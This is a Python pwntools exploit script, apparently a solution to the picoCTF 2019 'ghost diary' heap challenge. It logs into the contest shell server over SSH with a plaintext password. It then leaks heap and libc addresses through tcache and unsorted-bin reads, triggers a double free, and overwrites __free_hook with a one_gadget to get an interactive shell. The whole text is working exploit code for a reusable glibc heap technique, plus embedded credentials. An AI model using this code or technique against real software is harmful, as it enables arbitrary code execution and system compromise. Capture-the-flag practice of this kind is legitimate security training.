from pwn import *
from time import sleep

sh = ssh(host='2019shell1.picoctf.com', user='jamesyoung', password='pBCNtaNiAc7Fs&F')
server = sh.process('ghostdiary', cwd='/problems/ghost-diary_5_7e39864bc6dc6e66a1ac8f4632e5ffba')

def new_page(size):
    server.sendline('1')
    if size <= 240:
        server.sendline('1')
    elif size >= 272 and size <= 480:
        server.sendline('2')
    else:
        print('Invalid size')
        print(0/0)
    server.sendline(str(size))
    return server.recv(4096)
    
def write_page(page, content):
    server.sendline('2')
    server.sendline(str(page))
    server.sendline(content)
    return server.recv(4096)
    
def read_page(page):
    server.sendline('3')
    server.sendline(str(page))
    return server.recv(4096)

def burn(page):
    server.sendline('4')
    server.sendline(str(page))
    return server.recv(4096)

""" HEAP LEAK """
# Get a chunk to store a tcache linked list pointer ...
new_page(240)
new_page(240)
burn(0)
burn(1)
# tcache
for i in range(7): 
    new_page(240)
# read tcache pointer
leak = read_page('0').split()
print(leak)
leak = leak[leak.index('Content:')+1]
leak = [hex(ord(c))[2:] for c in leak[::-1]]
# offset
heap_base = int(''.join(leak), 16) - 0x260
print('---- HEAP BASE: ' + hex(heap_base) + ' ----')

""" DOUBLE FREE """
# pg 7 (chunk 0)
new_page(280)
# pg 8 (chunk 1)
new_page(280) 
# pg 9 (chunk 2)
new_page(240)
# prevents consolidation with wilderness
new_page(24)
# Write addresses to chunk 1 (pg 8) into chunk 0 (pg 7)
write_page(7, 2*p64(0) + 2*p64(heap_base + 0xa70))
# Write addresses to chunk 0 (pg 7) into chunk 1 (pg 8)
write_page(8, p64(0) + p64(heap_base + 0x960) + (35-3)*p64(0) + p64(0x120))
# Now trigger the double-free
for i in range(10):
    burn(i)

""" LEAK LIBC """
# Just read off of the chunk from the unsorted chunk freed linked list
new_page(296) # pg 0 --- size is bigger than 
leak = read_page(0).split()
leak = leak[leak.index('Content:')+1]
leak = [hex(ord(c))[2:] for c in leak[::-1]]
libc_base = int(''.join(leak), 16) - 0x3ca1f0 - 528
one_gadget = libc_base + 0x2d872
free_hook = libc_base + 0x3cbe38
print('---- LIBC BASE: ' + hex(libc_base) + ' ----')
print('---- FREE HOOK: ' + hex(free_hook) + ' ----')
    
""" USE DOUBLE FREE """
write_page(0, p64(free_hook))
# pg 1 --- push free_hook onto tcache
new_page(280) 
# pg 2 --- this is free_hook
new_page(280)
# sets free = one_gadget
write_page(2, p64(one_gadget))
# Free everything
burn(0)
server.interactive()